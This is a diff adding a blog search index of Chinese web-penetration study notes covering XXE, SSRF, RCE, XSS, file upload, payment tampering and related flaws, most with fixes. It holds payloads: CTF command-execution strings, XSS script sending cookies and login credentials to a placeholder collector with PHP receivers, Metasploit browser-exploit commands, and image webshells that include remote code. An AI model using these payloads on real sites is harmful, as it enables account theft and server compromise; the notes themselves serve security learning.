@@ -1,0 +1,629 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>XML &amp; XXE &amp; 无回显</title>
+      <link href="/2023/05/08/XML%20&amp;%20XXE%20&amp;%20%E6%97%A0%E5%9B%9E%E6%98%BE/"/>
+      <url>/2023/05/08/XML%20&amp;%20XXE%20&amp;%20%E6%97%A0%E5%9B%9E%E6%98%BE/</url>
+      
+        <content type="html"><![CDATA[<h1 id="XML-amp-XXE-amp-无回显"><a href="#XML-amp-XXE-amp-无回显" class="headerlink" title="XML &amp; XXE &amp; 无回显"></a>XML &amp; XXE &amp; 无回显</h1><p>  XML &amp;  XXE 原理-发现-利用-修复<br>XML语言被设计为传输和存储数据</p><p>xml的焦点是数据内容<br>HTML的焦点是显示内容<br>HTML在显示信息，xml在传输信息</p><p>XXE漏洞，xml外部实体注入漏洞<br>xxe漏洞发生在应用程序解析xml输入时</p><p>XXE黑盒发现：<br>1、根据数据格式<br>2、Content-type 请求头<br>3、svg $ excel 引用</p><p>白盒：<br>1、可以ton过应用功能追踪代码定位审计<br>2、可以通过脚本特定函数搜索定位审计<br>3、可通过伪协议玩法绕过相关修复</p><p>有回显：<br>1、file读取文件<br>2、http带外访问</p><p>无回显：<br>1、file读取文件<br>2、http带外访问<br>3、dtd实体带访问-数据参数发送<br>4、接受文件接受数据处理</p><p>协议玩法：<br>…………….</p><p>修复：<br>1、禁用实体引用<br>2、过滤关键字：<br>&lt;!OCTYPE 和 &lt;!ENTITY 或者 SYSTEM 和 PUBLIC</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> XML,XXE </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title></title>
+      <link href="/2023/05/08/SSRF/"/>
+      <url>/2023/05/08/SSRF/</url>
+      
+        <content type="html"><![CDATA[<h1 id="SSRF-服务器端请求伪造"><a href="#SSRF-服务器端请求伪造" class="headerlink" title="SSRF 服务器端请求伪造"></a>SSRF 服务器端请求伪造</h1><p>伪造请求，让服务器自己访问自己</p><ul><li>条件<br>当功能应用点利用服务器去解析提交的资源时</li><li>流程<br>可以做<br>1、服务探针<br>请求自己的端口<br>http:127.0.0.1:8081</li></ul><p>2、协议玩法<br>3、内网扫描<br>更改ip地址</p><p>4、漏洞利用</p><p>可以访问内网内部资源</p><ul><li>常规修复（审计与防御）</li></ul><p>– 经常出现的功能点<br>（会使用服务器去加载一些信息）<br>分享<br>转码<br>翻译<br>收藏<br>图片加载</p><p>  –SSRF白盒可能出现的的地方<br>1、功能点抓包指向代码块审计<br>2、功能点函数定位</p><p>  –SSRF常见安全修复方案<br>1、禁用跳转<br>2、禁用不需要的协议<br>3、固定或限制资源地址<br>4、错误信息统一信息处理</p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title></title>
+      <link href="/2023/05/08/RCE%E6%BC%8F%E6%B4%9E/"/>
+      <url>/2023/05/08/RCE%E6%BC%8F%E6%B4%9E/</url>
+      
+        <content type="html"><![CDATA[<h1 id="RCE漏洞"><a href="#RCE漏洞" class="headerlink" title="RCE漏洞"></a>RCE漏洞</h1><h2 id="RCE代码执行-x2F-x2F-eval-‘phpinfo-’-解析代码"><a href="#RCE代码执行-x2F-x2F-eval-‘phpinfo-’-解析代码" class="headerlink" title="RCE代码执行 &#x2F;&#x2F;eval(‘phpinfo()’) 解析代码"></a>RCE代码执行 &#x2F;&#x2F;eval(‘phpinfo()’) 解析代码</h2><h2 id="命令执行-x2F-x2F-system-‘ver’-调用系统命令"><a href="#命令执行-x2F-x2F-system-‘ver’-调用系统命令" class="headerlink" title="命令执行 &#x2F;&#x2F; system(‘ver’)  调用系统命令"></a>命令执行 &#x2F;&#x2F; system(‘ver’)  调用系统命令</h2><p> eval是Python的一个内置函数，功能十分强大，这个函数的作用是，返回传入字符串的表达式的结果。就是说：将字符串当成有效的表达式 来求值 并 返回计算结果。</p><blockquote><p>eval(expression[, globals[, locals]])<br>expression ： 表达式。<br>globals ： （可选参数)变量作用域，全局命名空间，如果被提供，则必须是一个字典对象。<br>locals ： (可选参数)变量作用域，局部命名空间，如果被提供，可以是任何映射对象。</p></blockquote><p>存在场景</p><blockquote><p>存在一些功能，在应用功能中<br>需要调用脚本代码或者系统命令执行</p></blockquote><p>web，中间件，操作系统，框架都存在</p><h2 id="危害，直接执行命令或代码"><a href="#危害，直接执行命令或代码" class="headerlink" title="危害，直接执行命令或代码"></a>危害，直接执行命令或代码</h2><p>可以写入后门…</p><blockquote><p>黑盒漏洞难以发现</p></blockquote><h2 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h2><h4 id="1-PHP："><a href="#1-PHP：" class="headerlink" title="1.PHP："></a>1.PHP：</h4><p>eval()、assert()、preg_replace()、call_user_func()、<br>call_user_func_array()以及 array_map()等</p><blockquote><p>system、shell_exec、popen、passthru、proc_open 等</p></blockquote><p><code>?a =echo shell_exec(&#39;ls&#39;)</code><br><code>?a=echo shell_exec(&#39;tac fla*&#39;)</code></p><h4 id="2-Python："><a href="#2-Python：" class="headerlink" title="2.Python："></a>2.Python：</h4><p>eval exec subprocess os.system commands </p><h4 id="3-Java："><a href="#3-Java：" class="headerlink" title="3.Java："></a>3.Java：</h4><p>Java 中没有类似 php 中 eval 函数这种直接可以将字符串转化为代码执行的函数，<br>但是有反射机制，并且有各种基于反射机制的表达式引擎，如: OGNL、SpEL、MVEL<br>等.</p><h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><p>源码中存在<code>eval（$a）</code></p><p>system(‘ls’)<br>命令执行：</p><blockquote><p>? a &#x3D;  system(‘tac fla*.php’)</p></blockquote><p>代码执行</p><blockquote><p>? a &#x3D; phpinfo()</p></blockquote><h4 id="有过滤："><a href="#有过滤：" class="headerlink" title="有过滤："></a>有过滤：</h4><p>参数逃逸： 绕过过滤参数<br><code>eval($_GET[1]);&amp;1=system(&#39;tac flag.php&#39;);</code></p><p>32~36-配合包含&amp;伪协议</p><p><code>include$_GET[a]?&gt;&amp;a=data://text/plain,&lt;?=system(&#39;tac  flag.php&#39;);?&gt;</code></p><p><code>include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64- encode/resource=flag.php</code></p><p>37~39-包含&amp;伪协议&amp;通配符</p><p><code>data://text/plain,&lt;?=system(&#39;tac fla*&#39;);?&gt;</code></p><p><code>php://input post:&lt;?php system(&#39;tac flag.php&#39;);?&gt;</code></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>CSRF &amp; SSRF代码审计 &amp; 同源策略</title>
+      <link href="/2023/05/08/CSRF&amp;SSRF%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1&amp;%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"/>
+      <url>/2023/05/08/CSRF&amp;SSRF%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1&amp;%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/</url>
+      
+        <content type="html"><![CDATA[<h1 id="CSRF-amp-SSRF代码审计-amp-同源策略"><a href="#CSRF-amp-SSRF代码审计-amp-同源策略" class="headerlink" title="CSRF &amp; SSRF代码审计 &amp; 同源策略"></a>CSRF &amp; SSRF代码审计 &amp; 同源策略</h1><p>CSRF<br>可以根据跨站请求伪造<br>来进行管理员的增加获得账号<br>特性：<br>1、直接复现<br>成功–》存在漏洞<br>失败–》过滤缺陷–》绕过–》存在<br>失败–》过滤完整–》不存在</p><ul><li>探针与防御<br>1、验证来源（数据包有来源验证）<br>2、看凭据有无token<br>3、看关键操作有无验证</li></ul><p>伪造来源<br>1、伪造-需要在代码数据包文件固定来源<br>2、尝试在网站寻找可上传地方，上传数据包，取得当前同域名访问地址</p><p>SSRF<br>服务器请求伪造<br>可以直接获取内网的资源信息</p><p>白盒可能出现<br>1、根据功能分析</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 代码审计 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>通用漏洞-CRLF注入 &amp; URL重定向 &amp; 资源处理拒绝服务</title>
+      <link href="/2023/05/08/%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5&amp;URL%E9%87%8D%E5%AE%9A%E5%90%91&amp;%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/"/>
+      <url>/2023/05/08/%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5&amp;URL%E9%87%8D%E5%AE%9A%E5%90%91&amp;%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/</url>
+      
+        <content type="html"><![CDATA[<h1 id="通用漏洞-CRLF注入-amp-URL重定向-amp-资源处理拒绝服务"><a href="#通用漏洞-CRLF注入-amp-URL重定向-amp-资源处理拒绝服务" class="headerlink" title="通用漏洞-CRLF注入 &amp; URL重定向 &amp; 资源处理拒绝服务"></a>通用漏洞-CRLF注入 &amp; URL重定向 &amp; 资源处理拒绝服务</h1><p>1、CRLF注入是啥？<br>控制数据包，更改格式<br>用处不大</p><p>可以用工具跑<br>curlfuzz.exe文件</p><p>2、URL重定向<br>inurl:url&#x3D;<a href="http://site:edu.cn">http://site:edu.cn</a><br>inurl:login url&#x3D;<a href="http://site:edu.cn">http://site:edu.cn</a></p><h4 id="url-重定向可以配合钓鱼"><a href="#url-重定向可以配合钓鱼" class="headerlink" title="url 重定向可以配合钓鱼"></a>url 重定向可以配合钓鱼</h4><ul><li>用户访问目标网站</li><li>攻击者搭建相似网站</li><li>用户访问重定向到我搭建的网站</li><li>登录的账号密码可以直接获取</li></ul><p>&amp; URL&#x3D;<a href="http://www.xxx.com/x.php?user=xxx&pass=xxx">http://www.xxx.com/x.php?user=xxx&amp;pass=xxx</a></p><p>在登录页面上嵌入script代码，接收username和password，请求我的钓鱼网站，接收并保存</p><p>不影响用户正常登录,并且接收到数据</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>图片资源没有限制长度宽度</p><h3 id="设置宽度9999999999999999999999999999999999999999999999999999999999999999999999999999999999999"><a href="#设置宽度9999999999999999999999999999999999999999999999999999999999999999999999999999999999999" class="headerlink" title="设置宽度9999999999999999999999999999999999999999999999999999999999999999999999999999999999999"></a>设置宽度9999999999999999999999999999999999999999999999999999999999999999999999999999999999999</h3><h3 id="不断访问占用目标网站资源"><a href="#不断访问占用目标网站资源" class="headerlink" title="不断访问占用目标网站资源"></a>不断访问占用目标网站资源</h3><p>编写无线解压42炸弹的代码，直接在网站访问，网站资源被占用100%</p><h1 id="直接资源拒绝服务GG"><a href="#直接资源拒绝服务GG" class="headerlink" title="直接资源拒绝服务GG"></a>直接资源拒绝服务GG</h1>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 通用漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>通用漏洞-验证码 &amp; 复用 &amp; 调用 &amp; 找回密码 &amp; 重定向</title>
+      <link href="/2023/05/08/%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81&amp;%E5%A4%8D%E7%94%A8&amp;%E8%B0%83%E7%94%A8&amp;%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81&amp;%E9%87%8D%E5%AE%9A%E5%90%91/"/>
+      <url>/2023/05/08/%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81&amp;%E5%A4%8D%E7%94%A8&amp;%E8%B0%83%E7%94%A8&amp;%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81&amp;%E9%87%8D%E5%AE%9A%E5%90%91/</url>
+      
+        <content type="html"><![CDATA[<h1 id="通用漏洞-验证码-amp-复用-amp-调用-amp-找回密码-amp-重定向"><a href="#通用漏洞-验证码-amp-复用-amp-调用-amp-找回密码-amp-重定向" class="headerlink" title="通用漏洞-验证码 &amp; 复用 &amp; 调用 &amp; 找回密码 &amp; 重定向"></a>通用漏洞-验证码 &amp; 复用 &amp; 调用 &amp; 找回密码 &amp; 重定向</h1><p>-找回密码流程安全<br>1、回显状态-res前端判断不安全</p><ul><li>在数据包中可以看到，随便输入一个，抓包可以看到<code>1、回显</code>，直接在包中修改验证码</li><li>res修改-绑定手机号时，修改<code>2、返回状态值</code>判定通过   返回1 正确 2 错误。。。。需分析<br>前端验证—存在修改攻击隐患</li></ul><h4 id="查看是否存在回显漏洞"><a href="#查看是否存在回显漏洞" class="headerlink" title="查看是否存在回显漏洞"></a>查看是否存在回显漏洞</h4><ul><li>1、状态，首先查看正确的回显状态 </li><li>2、查看失败回显状态</li><li>3、抓包使用成功回显覆盖失败回显，可以绕过直接重置密码</li></ul><p>2、用用户名重定向-修改标识绕过验证<br>3、验证码回显显示-验证码泄露验证虚设<br>4、验证码简单机制-验证码过于简单可以直接爆破<br>查看返回状态不同点，或者返回的长度有哪些不同</p><h5 id="简单爆破"><a href="#简单爆破" class="headerlink" title="简单爆破"></a>简单爆破</h5><p>sent to instruder<br>clear<br>add<br>choose number<br>start-step-end<br>intruder-&gt;startattack</p><p>-验证码绕过安全<br>1、验证码简单机制-简单爆破</p><p>2、重复使用</p><p>3、验证码接口调用</p><p>4、验证码智能识别</p><p>burp插件<br>NEW_xp+CAPTCHA<br>c0ny&#x2F;captcha-killer<br>使用环境：win10 python3.6.5</p><h1 id="安全修复"><a href="#安全修复" class="headerlink" title="安全修复"></a>安全修复</h1><ul><li>找回机制要进行每一步验证-防止绕过重定向</li><li>找回机制要进行服务段验证-防止res数据修改</li><li>找回机制要控制验证码安全- 防止验证码攻击</li><li>验证码接口需验证后被调用-防止接口被乱调用</li><li>验证码应用人工智能话判断- 防止验证码被识别</li><li>验证码采用时间段生效-防止验证码被复用</li></ul>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 通用漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>通用漏洞-文件读取 &amp; 任意文件下载 &amp; 文件删除 &amp; 黑盒分析-下载读取</title>
+      <link href="/2023/05/08/%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96&amp;%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD&amp;%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4&amp;%E9%BB%91%E7%9B%92%E5%88%86%E6%9E%90/"/>
+      <url>/2023/05/08/%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96&amp;%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD&amp;%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4&amp;%E9%BB%91%E7%9B%92%E5%88%86%E6%9E%90/</url>
+      
+        <content type="html"><![CDATA[<h1 id="通用漏洞-文件读取-amp-任意文件下载-amp-文件删除-amp-黑盒分析-下载读取"><a href="#通用漏洞-文件读取-amp-任意文件下载-amp-文件删除-amp-黑盒分析-下载读取" class="headerlink" title="通用漏洞-文件读取 &amp; 任意文件下载 &amp; 文件删除 &amp; 黑盒分析-下载读取"></a>通用漏洞-文件读取 &amp; 任意文件下载 &amp; 文件删除 &amp; 黑盒分析-下载读取</h1><h2 id="文件读取：基本和文件赖在利用类似"><a href="#文件读取：基本和文件赖在利用类似" class="headerlink" title="文件读取：基本和文件赖在利用类似"></a>文件读取：基本和文件赖在利用类似</h2><h2 id="1、文件下载"><a href="#1、文件下载" class="headerlink" title="1、文件下载"></a>1、文件下载</h2><p>可以下载敏感文件，对后续进行分析<br>login.php index.php includes&#x2F;core.php  数据库配置文件  源码</p><p>下载文件URL<br>没有安全问题</p><blockquote><p>soft&#x2F;2.zip</p></blockquote><p>直接进入页面，不会下载</p><blockquote><p>soft&#x2F;index.php</p></blockquote><p>使用下载协议去解析文件</p><blockquote><p>down ?file&#x3D; ..&#x2F;configuration.php</p></blockquote><p>解析后，下载主页面</p><blockquote><p>down ?file&#x3D;index.php</p></blockquote><h4 id="分析下载文件漏洞"><a href="#分析下载文件漏洞" class="headerlink" title="分析下载文件漏洞"></a>分析下载文件漏洞</h4><p>1、复制下载链接<br>2、分析下载路径<br>3、更改下载路径</p><h1 id="xhcms"><a href="#xhcms" class="headerlink" title="xhcms"></a>xhcms</h1>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 通用漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title></title>
+      <link href="/2023/05/08/%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83&amp;%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/"/>
+      <url>/2023/05/08/%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83&amp;%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>通用漏洞-跨域 &amp; CORS 资源 &amp; JSONP跨域回调</title>
+      <link href="/2023/05/08/%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9F&amp;CORS%E8%B5%84%E6%BA%90&amp;JSONP%E8%B7%A8%E5%9F%9F%E5%9B%9E%E8%B0%83/"/>
+      <url>/2023/05/08/%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9F&amp;CORS%E8%B5%84%E6%BA%90&amp;JSONP%E8%B7%A8%E5%9F%9F%E5%9B%9E%E8%B0%83/</url>
+      
+        <content type="html"><![CDATA[<h1 id="通用漏洞-跨域-amp-CORS-资源-amp-JSONP跨域回调"><a href="#通用漏洞-跨域-amp-CORS-资源-amp-JSONP跨域回调" class="headerlink" title="通用漏洞-跨域 &amp; CORS 资源 &amp; JSONP跨域回调"></a>通用漏洞-跨域 &amp; CORS 资源 &amp; JSONP跨域回调</h1><h3 id="同源策略（sop）-同源包括三个条件：同协议，同域名，同端口"><a href="#同源策略（sop）-同源包括三个条件：同协议，同域名，同端口" class="headerlink" title="同源策略（sop） 同源包括三个条件：同协议，同域名，同端口"></a>同源策略（sop） 同源包括三个条件：同协议，同域名，同端口</h3><p>浏览器安全策略<br>限制从一个源加载的文档或脚本与来自另一个源的资源进行交互，这是一个用于隔离潜在恶意文件的关键的安全机制<br>虽然同源策略在安全方面起到了很好的防护作用，但是也在一定程度上限制了一些前端功能的实现<br>所以就有了许多跨域的手段。</p><h3 id="CORS跨域资源共享–突破同源策略"><a href="#CORS跨域资源共享–突破同源策略" class="headerlink" title="CORS跨域资源共享–突破同源策略"></a>CORS跨域资源共享–突破同源策略</h3><p>是HTML5的新特性，是 <strong>放宽同源策略</strong> 的机制，它允许浏览器向跨源服务器，发出xmlhttprequest请求，从而克服了Ajax智能同源使用的限制<br>使不同的网站可以跨域获取数据</p><h2 id="CORS漏洞资源共享-–-CSRF同源策略失败无效"><a href="#CORS漏洞资源共享-–-CSRF同源策略失败无效" class="headerlink" title="CORS漏洞资源共享 – CSRF同源策略失败无效"></a>CORS漏洞资源共享 – CSRF同源策略失败无效</h2><h1 id="获取到你的资源"><a href="#获取到你的资源" class="headerlink" title="获取到你的资源"></a>获取到你的资源</h1><p>用户A 登录自己的后台页面后–》访问了第三方页面–》第三方页面去请求后台或者页面内容–》用户A访问了页面同时将自己的页面内容泄露出去</p><h2 id="jsonp"><a href="#jsonp" class="headerlink" title="jsonp"></a>jsonp</h2><p>支付接口登录接口等调用第三方接口时，不是同源，怎么办，不符合同源策略</p><p>所以会设置白名单进行cors资源跨域共享<br>Access-Control-Allow-Origin:* 表示其他页面能搞获取此页面的资源</p><h2 id="如何判断？"><a href="#如何判断？" class="headerlink" title="如何判断？"></a>如何判断？</h2><p>看数据包力有哪些回调？<br>1、F12<br>2、Preserve log<br>3、search -callback<br>4、查看回调信息</p><p>bp 回调插件</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 通用漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>通用漏洞-购买支付逻辑 &amp; 数据篡改</title>
+      <link href="/2023/05/08/%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91&amp;%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9/"/>
+      <url>/2023/05/08/%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91&amp;%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9/</url>
+      
+        <content type="html"><![CDATA[<h1 id="通用漏洞-购买支付逻辑-amp-数据篡改"><a href="#通用漏洞-购买支付逻辑-amp-数据篡改" class="headerlink" title="通用漏洞-购买支付逻辑 &amp; 数据篡改"></a>通用漏洞-购买支付逻辑 &amp; 数据篡改</h1><p>篡改购买价格、购买数量、支付方式、订单号、支付状态<br>替换支付、重复支付、最小额支付、负数支付、溢出支付、优惠券支付</p><p>1、产品覆盖</p><p>-用低价该高价的商品，对比两个数据包，对信息进行修改除了价格，其他信息改成高价商品的信息，post请求中的数据</p><p>2、支付接口修改-信息替换</p><p>抓包没有商品价格，可以修改数量</p><p>没有数量咋办？</p><h4 id="没办法，想其他思路-–-优惠券"><a href="#没办法，想其他思路-–-优惠券" class="headerlink" title="没办法，想其他思路  – 优惠券"></a>没办法，想其他思路  – 优惠券</h4><p>3、使用优惠券和不时有优惠券抓包找不同</p><p>找到使用优惠券的数据包<code>特征</code><br>修改优惠券数据</p><h5 id="使用优惠券薅羊毛"><a href="#使用优惠券薅羊毛" class="headerlink" title="使用优惠券薅羊毛"></a>使用优惠券薅羊毛</h5><p>修复-优惠券-数据特征不明显，加密字段</p><p>4、订单覆盖</p><p>-用一个的订单覆盖10000的订单</p><p>抓包找到get请求头，用一个的去购买1000000的，覆盖数据包头</p><p><a href="http://guarantee1.qilecms.com/">http://guarantee1.qilecms.com/</a></p><p>直接抓包修改</p><h3 id="漏洞修复-amp-代码审计"><a href="#漏洞修复-amp-代码审计" class="headerlink" title="漏洞修复 &amp; 代码审计"></a>漏洞修复 &amp; 代码审计</h3><p>1、金额以数据库为准-不然呢就可以进行篡改了（前提是数据库信息安全，没有被篡改哦）<br>2、购买数量限制为正整数（不能为负数或者小数哦）</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 通用漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>xss-3</title>
+      <link href="/2023/05/08/XSS-3/"/>
+      <url>/2023/05/08/XSS-3/</url>
+      
+        <content type="html"><![CDATA[<p>——— 鲁迅曾经说过，乱点链接的人就该中马。</p><h1 id="XSS（跨站脚本攻击）Cross-Site-Scripting"><a href="#XSS（跨站脚本攻击）Cross-Site-Scripting" class="headerlink" title="XSS（跨站脚本攻击）Cross-Site Scripting"></a>XSS（跨站脚本攻击）Cross-Site Scripting</h1><p>利用攻击：<br>–条件：已经取得web权限<br>一、XSS-后台植入Cookie表单劫持<br>1、写入代码到登陆成功文件，利用beef或xss平台实时监控cookie等凭据实现权限维持<br>2、若存在同源策略或防护情况下，cookie获取失败可采用表单劫持或数据明文传输实现</p><p>（后台植入）—–对后台长期控制：在取得web权限后，插入恶意代码在index.php中<br>每次登录成功，获取cookie<br>登录抓包直接修改cookie</p><p>《1》cookie劫持无效，可以简单表单劫持<br>&#x3D;&#x3D;》1、在登录页面写入监听劫持代码</p><p>$up&#x3D;’&lt;script src &#x3D; <a href="http://xxxxx/get.php?user=%27xxx%27&pass=%27xxx%27%3E">http://xxxxx/get.php?user=&#39;xxx&#39;&amp;pass=&#39;xxx&#39;&gt;</a></script><br>echo $up;<br>《2》&#x3D;&#x3D;》2、接收地址中写入接收文件<br><?php$u = $_GET['user'];                            //接收user$p = $_GET['pass'];        //接收pass$myfile = fopen("newfile.txt","w+")//新建newfile.txt文件 ---w+模式，追加字节 w模式，覆盖fwrite($myfile , $u);                          //写入接收的数据fwrite($myfile , $p);fwrite($myfile , '\n');fclose($myfile);//关闭文件?></p><p>二、xss-flash 钓鱼配合 MSF捆绑上线</p><p>&#x3D;&#x3D;》针对个人客户端<br>1、msf生成后门文件<br>2、下载官方文件<br>3、捆绑压缩，高级自定义，解压前运行后门文件<br>4、搭建钓鱼网站<br>5、诱导目标访问URL</p><p>三、xss-浏览器网页木马配合MSF访问上线<br>条件：beef上线受控制后直接钓鱼（浏览器存在0day漏洞）<br>&#x3D;&#x3D;》针对浏览器</p><p>攻击目标win xp 和 win 7<br>1、配置MSF生成URL<br>use exploit&#x2F;windows&#x2F;browser&#x2F;ms14_064_ole_code_execution<br>set allowpowershellprompt true<br>set target 1<br>run<br>2、诱导访问目标URL</p><hr><p>服务器准备接收cookie文件</p><p>js: document.cookie</p><script>window.location.href='http:xxxxxxx/get.php?c='+document.cookie</script><p>存在script过滤</p><p>使用&lt;img src&#x3D;1 onerro&#x3D;window.location.href&#x3D;’<a href="http://xxx/get.php?a=">http://xxx/get.php?a=</a>‘ + document.cookie; &gt;</p><p>服务端接收数据文件：<br><?php$cookie=$_GET['c'];$myfile = fopen("cookie.txt","w+");fwrite($myfile,$cooke);fclose($myfile);?></p><p>存储型：<br>1、注册用户，写入xss《script》代码获取管理员cookie，管理员访问用户管理页面，自动提交cookie<br>2、自动修改密码：<br>注册用户写script代码修改管理员密码<br>管理员访问用户管理，自动修改管理员密码</p><p>获取到cookie但是无法使用，失效时间快<br>可以使用js 代码直接获取用户信息</p><p>xss防御<br>—xss修复</p><p>1、进行字符过滤，过滤敏感字符<br>ini_setting<br>2、开启session.cookie_httponly 设置为1<br>session.cookie_httponly&#x3D;1<br>ini_set(“session.cookie_httponly”,1);</p><p>3、csp策略<br>设置CSP（Content Securitu Policy）<br>header(“Content.Security.policy.img.src”self” “);</p><p>4、输入长度限制</p><p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;》进行攻防演示</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> XSS </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title></title>
+      <link href="/2023/05/08/XSS-2/"/>
+      <url>/2023/05/08/XSS-2/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>文件上传-02</title>
+      <link href="/2023/05/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-2/"/>
+      <url>/2023/05/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-2/</url>
+      
+        <content type="html"><![CDATA[<h1 id="文件上传漏洞（图片马）"><a href="#文件上传漏洞（图片马）" class="headerlink" title="文件上传漏洞（图片马）"></a>文件上传漏洞（图片马）</h1><p>文件头<br>png<br>GIF89a</p><p>1、先想办法上传带后门的文件xxx<br>xxx中有远程连接木马的代码（地址）</p><p>GIF89a<br>&lt;?&#x3D;include’<a href="http://47.94.236.117/'%3E">http://794750069/&#39;&gt;</a><br>2、在上传 .user.ini 文件使全局包括 xxx文件<br>auto_prepend_file&#x3D;xxx</p><p>访问：</p><p>1、图片二次渲染<br>过滤图片中的恶意代码</p><p>可以对比渲染前后二进制代码<br>找出共同部分<br>在此插入后门<br>会有文件检测程序<br>很大几率不成功</p><p>二次渲染过的成功上传的图片进行二进制脚本注入恶意代码</p><p>2、过滤字符组合<br><?php $a = ' syste ' . ' m ' ; $a ( ' tac ../flag.php' );?></p><p>总结步骤：<br>1、查看前端是否有验证<br>有验证直接修改<br>没有验证直接抓包</p><p>2、抓到包修改Content-Disposition filename &#x3D; ‘xxx.php’<br>Content-Type: image&#x2F;png</p><p>内容：xxxxxxxxxxxxxx(可插入后门代码)</p><p>如果直接上传成功，则直接利用</p><p>3、有内容字符过滤</p><ul><li><p>转换后门代码格式</p></li><li><p>图片中内容字符中可以插入后门代码</p></li><li><p>图片有二次渲染则保存二次渲染的图片</p><ul><li>在二次渲染的图片中插入后门代码</li></ul></li><li><p>突破 . 过滤</p><ul><li>利用远程ip转换地址调用执行<br> .user.ini  文件 auto_prepend_file&#x3D;xxx.png<br>  xxx.png<?=include'http://6464646'?><br>远程地址文件中添加后门，可以远程调用</li></ul></li></ul><p>调用：<br>post：x&#x3D;执行文件</p><hr><p>黑盒：<br>—-寻找一切勋在文件上传的功能应用<br>1、个人用户中心是否存在文件上传功能<br>2、后台管理系统是否存在文件上传功能<br>3、字典目录扫描探针文件上传构造地址<br>4、字典目录扫描探针编辑器目录构造地址<br>白盒：<br>—-白盒看三点，中间件，编辑器，功能代码<br>1、中间件直接看语言环境<br>2、编辑器直接看目录机构或搜索关键字<br>3、功能代码直接看源码应用或者搜索关键字</p><h2 id="编辑器分类："><a href="#编辑器分类：" class="headerlink" 